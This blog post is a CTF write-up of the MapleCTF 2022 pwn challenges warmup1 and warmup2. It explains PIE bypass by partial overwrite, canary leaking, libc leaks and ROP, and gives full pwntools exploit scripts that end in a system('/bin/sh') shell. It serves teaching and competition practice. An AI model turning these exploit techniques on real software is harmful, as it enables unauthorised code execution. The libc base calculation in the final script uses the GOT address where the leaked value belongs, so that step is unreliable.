@@ -1,0 +1,374 @@
+---
+title: "MapleCTF 2022 Pwn Warmup1&2 Writeup"
+date: "2022-08-30"
+tags: ['PWN', 'Writeup']
+draft: false
+summary: "This blog is the writeup of the two pwn challenges, warmup1 and warmup2, which are provided in the recent Maple CTF 2022. Though they are just warmup, I think they are really interesting and kind of complex in terms of the second one, which are worth evaluation and summary."
+---
+
+
+This blog is the writeup of the two pwn challenges, warmup1 and warmup2, which are provided in the recent Maple CTF 2022. Though they are just warmup, I think they are really interesting and kind of complex in terms of the second one, which are worth evaluation and summary. 
+
+
+
+This is my first time blogging in English. The reason why I trade off a bit of efficiency and decide to switch to English is that I found writing in English would help me fit in the new environment more smoothly, since I currently study in the U.S. And the second reason is that there are more audience who can't understand Chinese and I don't want to keep them away due to the language issue. However, I am still practicing my English, so plz be tolerant of my silly grammatical mistakes. 
+
+Hope you enjoy it!
+
+## warmup1
+
+The first challenge is simple but teaches us the easiest way to bypass the PIE.
+
+**So, what is the PIE? **
+
+Basically, PIE which stands for **P**osition **I**ndependent **E**xecutable, is a binary mitigation method supported by the compiler to generate the code without the fixed address. So, it means that when you compile a source code with the PIE option enabled, the instruction addresses in the binary are the offset and the real addresses will be decided when the binary is loaded and being executed, as opposed to the binary compile without PIE option which generate the code with the fixed address of virtual memory. The comparison is shown below.
+
+For the same warmup1 source code, the assembly is different especially in the address part.
+
+```C
+#include <stdio.h>
+#include <stdlib.h>
+
+void vuln() {
+    char buf[0x10];
+    read(0, buf, 0x100);
+}
+
+int main() {
+    alarm(60);
+    setbuf(stdout, NULL);
+    setbuf(stdin, NULL);
+
+    vuln();
+
+    return 0;
+}
+```
+
+```
+  ### warmup1 compiled without -pie
+  401156:       55                      push   %rbp
+  401157:       48 89 e5                mov    %rsp,%rbp
+  40115a:       48 83 ec 10             sub    $0x10,%rsp
+  40115e:       48 8d 45 f0             lea    -0x10(%rbp),%rax
+  401162:       ba 00 01 00 00          mov    $0x100,%edx
+  401167:       48 89 c6                mov    %rax,%rsi
+  40116a:       bf 00 00 00 00          mov    $0x0,%edi
+  40116f:       b8 00 00 00 00          mov    $0x0,%eax
+  401174:       e8 d7 fe ff ff          call   401050 <read@plt>
+  401179:       90                      nop
+  40117a:       c9                      leave
+  40117b:       c3                      ret
+  40117c:       55                      push   %rbp
+  40117d:       48 89 e5                mov    %rsp,%rbp
+  401180:       bf 3c 00 00 00          mov    $0x3c,%edi
+  401185:       b8 00 00 00 00          mov    $0x0,%eax
+  40118a:       e8 b1 fe ff ff          call   401040 <alarm@plt>
+  40118f:       48 8b 05 9a 2e 00 00    mov    0x2e9a(%rip),%rax        # 404030 <stdout@GLIBC_2.2.5>
+  401196:       be 00 00 00 00          mov    $0x0,%esi
+  40119b:       48 89 c7                mov    %rax,%rdi
+  40119e:       e8 8d fe ff ff          call   401030 <setbuf@plt>
+  4011a3:       48 8b 05 96 2e 00 00    mov    0x2e96(%rip),%rax        # 404040 <stdin@GLIBC_2.2.5>
+  4011aa:       be 00 00 00 00          mov    $0x0,%esi
+  4011af:       48 89 c7                mov    %rax,%rdi
+  4011b2:       e8 79 fe ff ff          call   401030 <setbuf@plt>
+  4011b7:       b8 00 00 00 00          mov    $0x0,%eax
+  4011bc:       e8 95 ff ff ff          call   401156 <execl@plt+0xf6>
+  4011c1:       b8 00 00 00 00          mov    $0x0,%eax
+  4011c6:       5d                      pop    %rbp
+  4011c7:       c3                      ret
+```
+
+```
+### warmup1 compiled with pie
+    1169:       55                      push   %rbp
+    116a:       48 89 e5                mov    %rsp,%rbp
+    116d:       48 83 ec 10             sub    $0x10,%rsp
+    1171:       48 8d 45 f0             lea    -0x10(%rbp),%rax
+    1175:       ba 00 01 00 00          mov    $0x100,%edx
+    117a:       48 89 c6                mov    %rax,%rsi
+    117d:       bf 00 00 00 00          mov    $0x0,%edi
+    1182:       b8 00 00 00 00          mov    $0x0,%eax
+    1187:       e8 c4 fe ff ff          call   1050 <read@plt>
+    118c:       90                      nop
+    118d:       c9                      leave
+    118e:       c3                      ret
+    118f:       55                      push   %rbp
+    1190:       48 89 e5                mov    %rsp,%rbp
+    1193:       bf 3c 00 00 00          mov    $0x3c,%edi
+    1198:       b8 00 00 00 00          mov    $0x0,%eax
+    119d:       e8 9e fe ff ff          call   1040 <alarm@plt>
+    11a2:       48 8b 05 87 2e 00 00    mov    0x2e87(%rip),%rax        # 4030 <stdout@GLIBC_2.2.5>
+    11a9:       be 00 00 00 00          mov    $0x0,%esi
+    11ae:       48 89 c7                mov    %rax,%rdi
+    11b1:       e8 7a fe ff ff          call   1030 <setbuf@plt>
+    11b6:       48 8b 05 83 2e 00 00    mov    0x2e83(%rip),%rax        # 4040 <stdin@GLIBC_2.2.5>
+    11bd:       be 00 00 00 00          mov    $0x0,%esi
+    11c2:       48 89 c7                mov    %rax,%rdi
+    11c5:       e8 66 fe ff ff          call   1030 <setbuf@plt>
+    11ca:       b8 00 00 00 00          mov    $0x0,%eax
+    11cf:       e8 95 ff ff ff          call   1169 <__cxa_finalize@plt+0xf9>
+    11d4:       b8 00 00 00 00          mov    $0x0,%eax
+    11d9:       5d                      pop    %rbp
+    11da:       c3                      ret
+```
+
+When we execute the binary compiled with PIE and look at the memory map of the process, we would find the base address of the .text segment is different.
+
+![截屏2022-08-29 上午10.46.02](/static/images/MapleCTF-2022-WriteUp/%E6%88%AA%E5%B1%8F2022-08-29%20%E4%B8%8A%E5%8D%8810.46.02.png)
+
+However, for the binary compiled without PIE, the .text segment address will stay fixed and usually starts from the 0x400000.
+
+![截屏2022-08-29 上午10.48.31](/static/images/MapleCTF-2022-WriteUp/%E6%88%AA%E5%B1%8F2022-08-29%20%E4%B8%8A%E5%8D%8810.48.31.png)
+
+So, with PIE enabled, I need to do a few more steps to construct our ROP chains, since the gadgets's addresses are unavailable until the binary is being executed. 
+
+**How can we bypass the PIE mitigation?** 
+
+Now, let's look at the chall with this question in mind.
+
+![截屏2022-08-26 下午8.54.35](/static/images/MapleCTF-2022-WriteUp/%E6%88%AA%E5%B1%8F2022-08-26%20%E4%B8%8B%E5%8D%888.54.35.png)
+
+
+
+**As you can see, although the instruction's addresses are different each time, the last 3 digits（the lower 12 bits) of the address in hexadecimal format of each func address is the same as the offset address when we check it statically.** It doesn't affected by the PIE. This is the PIE's feature which we can exploit. This is because the .text segment will be loaded in page as a minimum unit to memory, and page size is 4KB which is 0x1000 bytes. So, if we can get/leak any one of the instruction addresses, we can easily infer the base address of the corresponding page and then calculate the actual instruction addresses in that pages(since the program is quite tiny, they often stay on the same page.). 
+
+However, if we can't leak any instruction address, it doesn't means that we can't bypass the PIE mitigation, we can still redirect the control flow to the place we want by using a technique called **Partial Write.**
+
+Let's see, for which instructions in the same page, their address's first 9 chars are is the same. When this vuln func is finished and begins to return to the main func, the ret address is 0x555555555212 which is the main+68's address, and the win func which is used for cat the flag is at 0x555555555219. They are pretty close. So we could just overflow an \x19 to overwrite the last byte of the ret address, so that it can direct to the win func and cat the flag then. 
+
+![截屏2022-08-26 下午8.51.17](/static/images/MapleCTF-2022-WriteUp/%E6%88%AA%E5%B1%8F2022-08-26%20%E4%B8%8B%E5%8D%888.51.17.png)
+
+```python
+#coding:utf-8
+import random
+from pwn import *
+
+sh = process('/home/kali/Desktop/Maple/warmup1/chal')
+# sh = remote("34.82.56.227",1337)
+payload = 24*b"A"+b'\x19'
+sh.send(payload)
+
+print(sh.recv())
+```
+
+![截屏2022-08-26 下午8.54.06](/static/images/MapleCTF-2022-WriteUp/%E6%88%AA%E5%B1%8F2022-08-26%20%E4%B8%8B%E5%8D%888.54.06.png)
+
+## warmup2
+
+The warmup1 is just a reminder to make sure you don't forget the easiest way to bypass PIE. Now, let's see the warmup2 challenge which is far more complex as well as more interesting.
+
+The binary of warmup2 has turned on the full protection. However, we can bypass those mitigation approaches one by one.
+
+![截屏2022-08-30 上午8.52.39](/static/images/MapleCTF-2022-WriteUp/%E6%88%AA%E5%B1%8F2022-08-30%20%E4%B8%8A%E5%8D%888.52.39.png)
+
+After I checked the binary, I didn't find any func like the win func in the warmup1, meaning that I need to use the system func and /bin/sh in the glibc. So at least, the following things we have to confirm to get shell.
+
++ The canary.
++ The base loading address of .text segment which is used to locate the helpful address of gadgets , so that we can construct our own ROP chain.
++ The glibc version used on the server.
++ The base loading address of glibc which enables us to locate the system func and /bin/sh string's address in the glibc.
+
+The vulnerable is func is shown below. There are two printf func followed two read func which enable us to manipulate the stack and show what is inside.
+
+![截屏2022-08-30 上午8.55.44](/static/images/MapleCTF-2022-WriteUp/%E6%88%AA%E5%B1%8F2022-08-30%20%E4%B8%8A%E5%8D%888.55.44.png)
+
+So our route of exploitation would be as follows:
+
++ Using the first read func to overwrite the last byte of canary and leverage the following printf func to leak the canary.
++ Using the second read func to redirect the program's control flow to the vuln func again, since more read&printf func is needed.
++ At the second round, first we can leak the base address of .text segment since by printing the ret address(main+68) in the stack.
++ And then, we try to leak the func's address in glibc. (more details below)
++ By leveraging the leaked func address(e.g. read, printf), we can decide the glibc's version used on the server and calculate the base address of glibc.  And finally redirect to the vuln func again.
++ After getting everything confirmed, during the last round, let's pwn this binary and get shell!
+
+Next, let me elaborate on a few key points in the above process.
+
+**how to leak the canary?**
+
+Stack Canaries is a random value (usually 8 bytes from the fs:[0x28]) placed below the rbp on the stack after the func has been called. Before the func finish, the current value of that variable is compared to the initial: if they are the same, no buffer overflow has occurred.
+
+![截屏2022-08-30 上午9.29.09](/static/images/MapleCTF-2022-WriteUp/%E6%88%AA%E5%B1%8F2022-08-30%20%E4%B8%8A%E5%8D%889.29.09.png)
+
+![截屏2022-08-30 上午9.29.36](/static/images/MapleCTF-2022-WriteUp/%E6%88%AA%E5%B1%8F2022-08-30%20%E4%B8%8A%E5%8D%889.29.36.png)
+
+The canary usually ends with \x00 in case it is printed out by printf or puts func, since the \x00 would truncate the string and mark the end of the string read in. What we need to do is just overwrite the last \x00 of the canary and the whole canary would be leaked by the printf func.
+
+```python
+# Handle the first read func
+sh.recvuntil(b"What's your name?\n")
+# try to leak the canary
+payload1 = b'A'*264
+payload1 += b'A'*1 # cover the \x00 in the canary
+sh.send(payload1)
+print("[*] Payload sended: %s" % payload1)
+canary = int.from_bytes(sh.recvuntil(b'!')[271:278].rjust(8,b'\x00'), 'little')
+print('[+]\033[32m Wow! We got the canary: %s \033[0m' % hex(canary))
+```
+
+**How to redirect the control flow under the protection of PIE?**
+
+Let's review what the warmup1 chall has taught us. Yes, partial write again.
+
+The ret address of the vuln func is 0x5555555552e2(main+64), and instruction of `call vuln` address locate at 0x5555555552dd(main+63), so we can just overwrite the last byte of ret address in the stack to \xdd to redirect the flow to vuln again.
+
+The reason why the instruction addresses shown above start with 0x55555555 is that I am using the gdb to debug the binary. It would be different when the binary is executed independently. 
+
+**One more thing worth noting is that why we didn't jump to where the main func or the vuln func start?** Because we can't, it would cause the segment fault you have tested it. For the former one, it starts with `push rbp;mov rbp, rsp;`and be careful that we just pop the ret address, so the stack may no longer be aligned to 16 bytes. However, the `call` instruction helps us push the next instruction after call the func to the stack which helps us avoid this issue. For the latter one, where the vuln func starts is 0x5555555551f1 and we couldn't redirect to this address by just overwriting one byte(If we really want to do this, we need to brute-force the second to last byte.)
+
+```python
+# return to the main and try to leak the glibc address
+sh.recvuntil(b'How old are you?\n')
+payload2 = b'A'*264 + p64(canary) + b'A'*8 + b'\xdd'
+sh.send(payload2)
+print("[*] Payload sended: %s" % payload2)
+sh.recvuntil(b'too!\n')
+```
+
+**How the leaked the func address in the glibc?**
+
+Only we got the leaked func address in the glibc, can we use the func and its offset to search the glibc version in the libc database and calculate the base loading address of glibc.
+
+The good new is that there are two ways!
+
+**For the first one, let's continue with the above idea and try to leak the glibc func address in the stack.**
+
+![截屏2022-08-30 上午10.39.54](/static/images/MapleCTF-2022-WriteUp/%E6%88%AA%E5%B1%8F2022-08-30%20%E4%B8%8A%E5%8D%8810.39.54.png)
+
+We could find ret address of main func in the stack which is the \_\_libc_start_main+205 which is just 16 bytes higher than the rbp (when we are in the vuln func).
+
+However, we should be noted that the offset(205), will be different depending on the version too. So don't try to use this offset to get the start address of  \_\_libc_start_main. Luckily, there is  \_\_libc_start_main_ret symbol in the libc database. Try this one.
+
+This link would be really helpful: https://libc.rip/
+
+![截屏2022-08-30 上午10.56.26](/static/images/MapleCTF-2022-WriteUp/%E6%88%AA%E5%B1%8F2022-08-30%20%E4%B8%8A%E5%8D%8810.56.26.png)
+
+```
+# Leak the __libc_start_main address
+print(sh.recvuntil(b"What's your name?\n"))
+payload5 = b'A'*288 # In the stack, the offset between the address of __libc_start_main+205 and current buffer is 0x126(0x110+0x10)
+sh.send(payload5)
+print("[*] Payload sended: %s" % payload5)
+
+__libc_start_main_ret_address = int.from_bytes(sh.recvuntil(b'!')[294:-1].ljust(8,b'\x00'), 'little')
+print('[+]\033[32m Wow! We got the __libc_start_main_ret address: %s \033[0m' % hex(__libc_start_main_ret_address))
+```
+
+**For the second way, it is really classic way to leak gblic that we can leak the got table.**
+
+https://book.hacktricks.xyz/reversing-and-exploiting/linux-exploiting-basic-esp/rop-leaking-libc-address
+
+Here is the exp:
+
+```
+# leak the func address in got
+sh.recvuntil(b'How old are you?')
+vuln_address = base_address + 4585 #0x11e9
+pop_rdi_address = base_address + 4947 # 0x1353
+
+elf =  ELF('./chal2')
+printf_got_address = elf.got['printf'] + base_address
+read_got_address = elf.got['read'] + base_address
+puts_plt_address = elf.plt['puts'] + base_address
+
+payload4 = b'A'*264 + p64(canary) + b'A'*8 + p64(pop_rdi_address) + p64(read_got_address) + p64(puts_plt_address) + p64(vuln_address)
+sh.send(payload4)
+print("[*] Payload sended: %s" % payload4)
+sh.recvuntil(b'too!\n')
+
+read_got_address = int.from_bytes(sh.recvline()[:-1].ljust(8,b'\x00'), 'little')
+print('[+]\033[32m Wow! We got the read func address: %s \033[0m' % hex(read_got_address))
+```
+
+Finally, we could determain the glibc version and the address of system() and /bin/sh.
+
+```
+# try to calculate the system and /bin/sh's address 
+libc = LibcSearcher('read', printf_got_address)
+libc.add_condition("read", read_got_address)
+libcbase = printf_got_address - libc.dump('read')
+system_addr = libcbase + libc.dump('system')
+binsh_addr = libcbase + libc.dump('str_bin_sh')
+```
+
+**Let's get shell!**
+
+After we got the canary, the base address of .text segment, the address of glibc and /bin/sh, we can construct the final ROP to get shell.
+
+AND, DONT FORGET THE MOVAPS ISSUE!
+
+```python
+from pwn import *
+from LibcSearcher import *
+
+context.arch = 'amd64'
+context.endian = 'little'
+
+sh = remote("34.168.67.147",1337)
+
+# Handle the first read func
+sh.recvuntil(b"What's your name?\n")
+# try to leak the canary
+payload1 = b'A'*264
+payload1 += b'A'*1 # cover the \x00 in the canary
+sh.send(payload1)
+print("[*] Payload sended: %s" % payload1)
+canary = int.from_bytes(sh.recvuntil(b'!')[271:278].rjust(8,b'\x00'), 'little')
+print('[+]\033[32m Wow! We got the canary: %s \033[0m' % hex(canary))
+
+# return to the main and try to leak the glibc address
+sh.recvuntil(b'How old are you?\n')
+payload2 = b'A'*264 + p64(canary) + b'A'*8 + b'\xdd'
+sh.send(payload2)
+print("[*] Payload sended: %s" % payload2)
+sh.recvuntil(b'too!\n')
+
+
+# Leak the code's base address
+sh.recvuntil(b"What's your name?\n")
+payload3 = b'A'*280 # 0x110 + 0x8
+sh.send(payload3)
+print("[*] Payload sended: %s" % payload3)
+main_e2_address = int.from_bytes(sh.recvuntil(b'!')[286:292].ljust(8,b'\x00'), 'little')
+base_address = main_e2_address - 4834 # 0x12e2
+print('[+]\033[32m Wow! We got the base address of .text segment: %s \033[0m' % hex(base_address))
+
+# leak the func address in got
+sh.recvuntil(b'How old are you?')
+vuln_address = base_address + 0x11e9 #0x11e9
+ret_address = base_address + 0x101a
+pop_rdi_address = base_address + 0x1353 # 0x1353
+
+elf =  ELF('./chal2')
+printf_got_address = elf.got['printf'] + base_address
+read_got_address = elf.got['read'] + base_address
+puts_plt_address = elf.plt['puts'] + base_address
+
+payload4 = b'A'*264 + p64(canary) + b'A'*8 + p64(pop_rdi_address) + p64(read_got_address) + p64(puts_plt_address) + p64(vuln_address)
+sh.send(payload4)
+print("[*] Payload sended: %s" % payload4)
+sh.recvuntil(b'too!\n')
+
+read_got_address = int.from_bytes(sh.recvline()[:-1].ljust(8,b'\x00'), 'little')
+print('[+]\033[32m Wow! We got the read func address: %s \033[0m' % hex(read_got_address))
+
+# try to calculate the system and /bin/sh's address 
+libc = LibcSearcher('read', printf_got_address)
+libc.add_condition("read", read_got_address)
+libcbase = printf_got_address - libc.dump('read')
+system_addr = libcbase + libc.dump('system')
+binsh_addr = libcbase + libc.dump('str_bin_sh')
+
+# Let's get the shell at this time
+sh.recvuntil(b"What's your name?\n")
+sh.send(b"HappyHacking!")
+
+print(sh.recv())
+# sh.recvuntil(b'How old are you?\n')
+payload5 = b'A'*264 + p64(canary) + b'A'*8 + p64(ret_address) + p64(pop_rdi_address) + p64(binsh_addr) + p64(system_addr)
+sh.send(payload5)
+
+print("[*] Payload sended: %s" % payload5)
+sh.recvuntil(b'too!')
+```
+
